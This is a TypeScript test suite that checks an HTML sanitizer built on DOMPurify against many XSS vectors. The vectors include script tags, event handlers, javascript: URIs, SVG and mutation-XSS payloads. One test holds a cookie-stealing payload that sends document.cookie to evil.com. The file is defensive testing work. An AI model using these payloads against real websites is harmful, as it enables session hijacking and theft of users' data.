/**
 * XSS Prevention Tests
 *
 * Comprehensive test suite for HTML sanitization and XSS attack prevention.
 * Tests against OWASP Top 10 XSS vectors and real-world attack patterns.
 *
 * **Security Standards:**
 * - OWASP Top 10 A03:2021 – Injection
 * - CWE-79: Cross-site Scripting (XSS)
 * - OWASP XSS Prevention Cheat Sheet
 *
 * **Attack Vectors Covered:**
 * - Script injection (<script>)
 * - Event handler injection (onerror, onload, etc.)
 * - Data protocol injection (javascript:, data:)
 * - HTML entity encoding bypasses
 * - Multi-character bypasses (<scr<script>ipt>)
 * - Context switching attacks
 * - SVG-based XSS
 * - Mutation XSS (mXSS)
 *
 * @see https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting
 * @see https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
 */

import { describe, expect, test } from 'vitest';
import { DOMPurify, DEFAULT_ALLOWED_TAGS, DEFAULT_ALLOWED_ATTRIBUTES } from '@/src/lib/security/html-sanitizer';

describe('XSS Prevention - HTML Sanitizer', () => {
  describe('Basic Script Injection', () => {
    test('should strip <script> tags', () => {
      const malicious = '<script>alert("XSS")</script>';
      const sanitized = DOMPurify.sanitize(malicious);
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('alert');
    });

    test('should strip <script> tags with content', () => {
      const malicious = '<p>Hello</p><script>document.cookie</script><p>World</p>';
      const sanitized = DOMPurify.sanitize(malicious);
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('document.cookie');
      expect(sanitized).toContain('Hello');
      expect(sanitized).toContain('World');
    });

    test('should strip <script> with uppercase tags', () => {
      const malicious = '<SCRIPT>alert("XSS")</SCRIPT>';
      const sanitized = DOMPurify.sanitize(malicious);
      expect(sanitized).not.toContain('SCRIPT');
      expect(sanitized).not.toContain('alert');
    });

    test('should strip <script> with mixed case', () => {
      const malicious = '<ScRiPt>alert("XSS")</sCrIpT>';
      const sanitized = DOMPurify.sanitize(malicious);
      expect(sanitized).not.toContain('script');
      expect(sanitized).not.toContain('alert');
    });

    test('should strip <script> with whitespace', () => {
      const malicious = '<script\n>alert("XSS")</script>';
      const sanitized = DOMPurify.sanitize(malicious);
      expect(sanitized).not.toContain('<script');
      expect(sanitized).not.toContain('alert');
    });

    test('should prevent multi-character bypass', () => {
      const malicious = '<scr<script>ipt>alert("XSS")</scr</script>ipt>';
      const sanitized = DOMPurify.sanitize(malicious);
      // DOMPurify strips the <script> tags, leaving escaped text (safe)
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('<scr');
      // Text "alert" may remain but without script context it's harmless
      expect(sanitized).not.toMatch(/<script/i);
    });
  });

  describe('Event Handler Injection', () => {
    test('should strip onerror event handler', () => {
      const malicious = '<img src="x" onerror="alert(\'XSS\')">';
      const sanitized = DOMPurify.sanitize(malicious);
      expect(sanitized).not.toContain('onerror');
      expect(sanitized).not.toContain('alert');
    });

    test('should strip onload event handler', () => {
      const malicious = '<body onload="alert(\'XSS\')">';
      const sanitized = DOMPurify.sanitize(malicious);
      expect(sanitized).not.toContain('onload');
      expect(sanitized).not.toContain('alert');
    });

    test('should strip onclick event handler', () => {
      const malicious = '<a href="#" onclick="alert(\'XSS\')">Click me</a>';
      const sanitized = DOMPurify.sanitize(malicious);
      expect(sanitized).not.toContain('onclick');
      expect(sanitized).not.toContain('alert');
    });

    test('should strip onmouseover event handler', () => {
      const malicious = '<div onmouseover="alert(\'XSS\')">Hover me</div>';
      const sanitized = DOMPurify.sanitize(malicious);
      expect(sanitized).not.toContain('onmouseover');
      expect(sanitized).not.toContain('alert');
    });

    test('should strip onerror with uppercase', () => {
      const malicious = '<img src="x" ONERROR="alert(\'XSS\')">';
      const sanitized = DOMPurify.sanitize(malicious);
      expect(sanitized).not.toContain('onerror');
      expect(sanitized).not.toContain('ONERROR');
      expect(sanitized).not.toContain('alert');
    });

    test('should strip event handlers with newlines', () => {
      const malicious = '<img src="x"\nonerror="alert(\'XSS\')">';
      const sanitized = DOMPurify.sanitize(malicious);
      expect(sanitized).not.toContain('onerror');
      expect(sanitized).not.toContain('alert');
    });
  });

  describe('Protocol-based Injection', () => {
    test('should strip javascript: protocol in href', () => {
      const malicious = '<a href="javascript:alert(\'XSS\')">Click me</a>';
      const sanitized = DOMPurify.sanitize(malicious);
      expect(sanitized).not.toContain('javascript:');
      expect(sanitized).not.toContain('alert');
    });

    test('should strip javascript: protocol in src', () => {
      const malicious = '<img src="javascript:alert(\'XSS\')">';
      const sanitized = DOMPurify.sanitize(malicious);
      expect(sanitized).not.toContain('javascript:');
      expect(sanitized).not.toContain('alert');
    });

    test('should block data: protocol with script content', () => {
      const malicious = '<img src="data:text/html,<script>alert(\'XSS\')</script>">';
      const sanitized = DOMPurify.sanitize(malicious);
      // Our secure sanitizer blocks data: URIs by default (ALLOWED_URI_REGEXP)
      expect(sanitized).not.toContain('data:text/html');
      expect(sanitized).not.toContain('alert');
      // Image tag may remain but without dangerous src
    });

    test('should strip vbscript: protocol', () => {
      const malicious = '<a href="vbscript:msgbox(\'XSS\')">Click me</a>';
      const sanitized = DOMPurify.sanitize(malicious);
      expect(sanitized).not.toContain('vbscript:');
      expect(sanitized).not.toContain('msgbox');
    });

    test('should allow safe http/https protocols', () => {
      const safe = '<a href="https://example.com">Safe link</a>';
      const sanitized = DOMPurify.sanitize(safe);
      expect(sanitized).toContain('https://example.com');
      expect(sanitized).toContain('Safe link');
    });

    test('should block URL-encoded protocol bypass attempt', () => {
      const malicious = '<a href="java%0ascript:alert(\'XSS\')">Click me</a>';
      const sanitized = DOMPurify.sanitize(malicious);
      // Our ALLOWED_URI_REGEXP blocks non-standard protocols including encoded ones
      expect(sanitized).not.toContain('java');
      expect(sanitized).not.toContain('alert');
      expect(sanitized).toContain('Click me'); // Text content preserved
    });
  });

  describe('HTML Entity Encoding Bypasses', () => {
    test('should handle HTML entity encoded script tags', () => {
      const malicious = '&lt;script&gt;alert("XSS")&lt;/script&gt;';
      const sanitized = DOMPurify.sanitize(malicious);
      // Entities should remain as-is (not decoded and executed)
      expect(sanitized).not.toContain('<script>');
    });

    test('should handle hex-encoded characters', () => {
      const malicious = '<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;(\'XSS\')">';
      const sanitized = DOMPurify.sanitize(malicious);
      expect(sanitized).not.toContain('onerror');
      expect(sanitized).not.toContain('alert');
    });

    test('should handle mixed encoding', () => {
      const malicious = '<img src="x" onerror="&#x61;lert(\'XSS\')">';
      const sanitized = DOMPurify.sanitize(malicious);
      expect(sanitized).not.toContain('onerror');
      expect(sanitized).not.toContain('alert');
    });
  });

  describe('SVG-based XSS', () => {
    test('should strip malicious SVG with script', () => {
      const malicious = '<svg><script>alert("XSS")</script></svg>';
      const sanitized = DOMPurify.sanitize(malicious);
      expect(sanitized).not.toContain('alert');
    });

    test('should strip SVG with onload event', () => {
      const malicious = '<svg onload="alert(\'XSS\')"></svg>';
      const sanitized = DOMPurify.sanitize(malicious);
      expect(sanitized).not.toContain('onload');
      expect(sanitized).not.toContain('alert');
    });

    test('should strip SVG with embedded JavaScript', () => {
      const malicious = '<svg><use href="data:image/svg+xml,<svg id=\'x\' xmlns=\'http://www.w3.org/2000/svg\' xmlns:xlink=\'http://www.w3.org/1999/xlink\'><script>alert(\'XSS\')</script></svg>"></use></svg>';
      const sanitized = DOMPurify.sanitize(malicious);
      expect(sanitized).not.toContain('alert');
    });
  });

  describe('Form-based Injection', () => {
    test('should strip form with action pointing to javascript:', () => {
      const malicious = '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>';
      const sanitized = DOMPurify.sanitize(malicious);
      expect(sanitized).not.toContain('javascript:');
      expect(sanitized).not.toContain('alert');
    });

    test('should strip formaction attribute', () => {
      const malicious = '<form><button formaction="javascript:alert(\'XSS\')">Submit</button></form>';
      const sanitized = DOMPurify.sanitize(malicious);
      expect(sanitized).not.toContain('javascript:');
      expect(sanitized).not.toContain('alert');
    });
  });

  describe('Iframe-based Injection', () => {
    test('should strip iframe with srcdoc containing script', () => {
      const malicious = '<iframe srcdoc="<script>alert(\'XSS\')</script>"></iframe>';
      const sanitized = DOMPurify.sanitize(malicious);
      expect(sanitized).not.toContain('alert');
    });

    test('should strip iframe with javascript: src', () => {
      const malicious = '<iframe src="javascript:alert(\'XSS\')"></iframe>';
      const sanitized = DOMPurify.sanitize(malicious);
      expect(sanitized).not.toContain('javascript:');
      expect(sanitized).not.toContain('alert');
    });
  });

  describe('Object and Embed Tags', () => {
    test('should strip object tag with malicious data', () => {
      const malicious = '<object data="javascript:alert(\'XSS\')"></object>';
      const sanitized = DOMPurify.sanitize(malicious);
      expect(sanitized).not.toContain('javascript:');
      expect(sanitized).not.toContain('alert');
    });

    test('should strip embed tag with malicious src', () => {
      const malicious = '<embed src="javascript:alert(\'XSS\')">';
      const sanitized = DOMPurify.sanitize(malicious);
      expect(sanitized).not.toContain('javascript:');
      expect(sanitized).not.toContain('alert');
    });
  });

  describe('Meta Tag Refresh Attacks', () => {
    test('should strip meta refresh with javascript:', () => {
      const malicious = '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">';
      const sanitized = DOMPurify.sanitize(malicious);
      expect(sanitized).not.toContain('javascript:');
      expect(sanitized).not.toContain('alert');
    });
  });

  describe('Link Tag Attacks', () => {
    test('should strip link with javascript: href', () => {
      const malicious = '<link rel="stylesheet" href="javascript:alert(\'XSS\')">';
      const sanitized = DOMPurify.sanitize(malicious);
      expect(sanitized).not.toContain('javascript:');
      expect(sanitized).not.toContain('alert');
    });
  });

  describe('Mutation XSS (mXSS)', () => {
    test('should prevent mXSS with svg and foreignObject', () => {
      const malicious = '<svg><foreignObject><p>Hello<iframe src="javascript:alert(\'XSS\')"></iframe></p></foreignObject></svg>';
      const sanitized = DOMPurify.sanitize(malicious);
      expect(sanitized).not.toContain('javascript:');
      expect(sanitized).not.toContain('alert');
    });

    test('should prevent mXSS with noscript', () => {
      const malicious = '<noscript><p title="</noscript><img src=x onerror=alert(\'XSS\')>"></noscript>';
      const sanitized = DOMPurify.sanitize(malicious);
      expect(sanitized).not.toContain('onerror');
      expect(sanitized).not.toContain('alert');
    });
  });

  describe('Context-specific Sanitization', () => {
    test('should strip all tags including scripts with sanitizeToText', () => {
      const input = '<p>Hello</p><script>alert("XSS")</script>';
      const sanitized = DOMPurify.sanitizeToText(input);
      // Our sanitizeToText method strips ALL HTML including script tags AND their content
      expect(sanitized).not.toContain('<p>');
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('alert'); // Script content is removed (secure!)
      expect(sanitized).toContain('Hello'); // Only safe text content remains
      expect(sanitized).toBe('Hello'); // Clean output
    });

    test('should allow specific safe tags only', () => {
      const input = '<p>Hello</p><script>alert("XSS")</script><b>World</b>';
      const sanitized = DOMPurify.sanitize(input, {
        ALLOWED_TAGS: ['p', 'b'],
      });
      expect(sanitized).toContain('<p>Hello</p>');
      expect(sanitized).toContain('<b>World</b>');
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('alert');
    });

    test('should use DEFAULT_ALLOWED_TAGS configuration', () => {
      const input = '<p>Text</p><h1>Header</h1><script>alert("XSS")</script>';
      const sanitized = DOMPurify.sanitize(input, {
        ALLOWED_TAGS: DEFAULT_ALLOWED_TAGS,
      });
      expect(sanitized).toContain('<p>Text</p>');
      expect(sanitized).toContain('<h1>Header</h1>');
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('alert');
    });

    test('should use DEFAULT_ALLOWED_ATTRIBUTES configuration', () => {
      const input = '<a href="https://example.com" onclick="alert(\'XSS\')">Link</a>';
      const sanitized = DOMPurify.sanitize(input, {
        ALLOWED_TAGS: ['a'],
        ALLOWED_ATTR: DEFAULT_ALLOWED_ATTRIBUTES,
      });
      expect(sanitized).toContain('href="https://example.com"');
      expect(sanitized).not.toContain('onclick');
      expect(sanitized).not.toContain('alert');
    });
  });

  describe('Real-world Attack Vectors', () => {
    test('should prevent XSS in user comments', () => {
      const userComment = 'Great article! <img src=x onerror="fetch(\'https://evil.com?cookie=\'+document.cookie)">';
      const sanitized = DOMPurify.sanitize(userComment);
      expect(sanitized).toContain('Great article!');
      expect(sanitized).not.toContain('onerror');
      expect(sanitized).not.toContain('fetch');
      expect(sanitized).not.toContain('evil.com');
    });

    test('should prevent XSS in markdown content', () => {
      const markdown = '# Hello\n\n<script>alert("XSS")</script>\n\nWorld';
      const sanitized = DOMPurify.sanitize(markdown);
      expect(sanitized).toContain('Hello');
      expect(sanitized).toContain('World');
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('alert');
    });

    test('should prevent XSS in search queries displayed back', () => {
      const searchQuery = '<img src=x onerror=alert(document.domain)>';
      const sanitized = DOMPurify.sanitizeToText(searchQuery);
      expect(sanitized).not.toContain('<img');
      expect(sanitized).not.toContain('onerror');
      // Text content may remain but without HTML context it's safe
    });

    test('should handle empty input', () => {
      const empty = '';
      const sanitized = DOMPurify.sanitize(empty);
      expect(sanitized).toBe('');
    });

    test('should handle null/undefined gracefully', () => {
      // DOMPurify converts non-strings to strings
      const sanitized = DOMPurify.sanitize(null as any);
      expect(typeof sanitized).toBe('string');
    });
  });

  describe('Performance and Edge Cases', () => {
    test('should handle very long strings', () => {
      const longString = '<p>' + 'a'.repeat(10000) + '</p>';
      const sanitized = DOMPurify.sanitize(longString);
      expect(sanitized).toContain('<p>');
      expect(sanitized.length).toBeGreaterThan(10000);
    });

    test('should handle deeply nested tags', () => {
      const nested = '<div>'.repeat(100) + 'content' + '</div>'.repeat(100);
      const sanitized = DOMPurify.sanitize(nested);
      expect(sanitized).toContain('content');
    });

    test('should handle malformed HTML', () => {
      const malformed = '<p>Hello<script>alert("XSS")</p>';
      const sanitized = DOMPurify.sanitize(malformed);
      expect(sanitized).toContain('Hello');
      expect(sanitized).not.toContain('alert');
    });

    test('should verify DOMPurify is supported', () => {
      expect(DOMPurify.isSupported()).toBe(true);
    });
  });
});
